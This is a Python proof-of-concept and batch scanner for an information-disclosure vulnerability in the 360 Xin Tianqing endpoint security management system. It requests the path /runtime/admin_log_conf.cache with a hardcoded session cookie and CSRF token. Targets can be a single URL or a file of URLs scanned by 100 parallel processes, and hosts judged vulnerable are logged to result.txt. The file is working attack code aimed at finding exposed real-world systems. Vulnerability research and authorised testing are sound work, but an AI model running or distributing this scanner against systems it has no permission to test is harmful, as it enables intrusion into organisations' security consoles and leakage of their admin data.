import requests
import argparse
import sys
import json
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 360新擎天安全漏洞扫描工                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u', '--url', type=str, dest='url', help="please input your url")
    parser.add_argument('-f', '--file', type=str, dest='file', help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urls = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                urls.append(url.strip())
        mp = Pool(100)
        mp.map(poc, urls)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/runtime/admin_log_conf.cache"
    headers = {
        'Cookie': 'SKYLAR88b01a1417345b57f690b2b762=t21o0o9a0ppooailtdrpvhii54;YII_CSRF_TOKEN=45a9798e6d275e132298db5772b6012eed45cf97s%3A40%3A%227381c92b697503d30fcc35405538b6195599a5e1%22%3B',
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0,i',
        'Te': 'trailers',
        'Connection': 'close',
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers)
        if res1.status_code == 200:
            if "登录" in res1.text:
                print(f'[+]{target}存在漏洞')
                with open('result.txt', 'a') as fp:
                    fp.write(target + '\n')
            else:
                print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(f'Error with {target}: {e}')

if __name__ == '__main__':
    main()
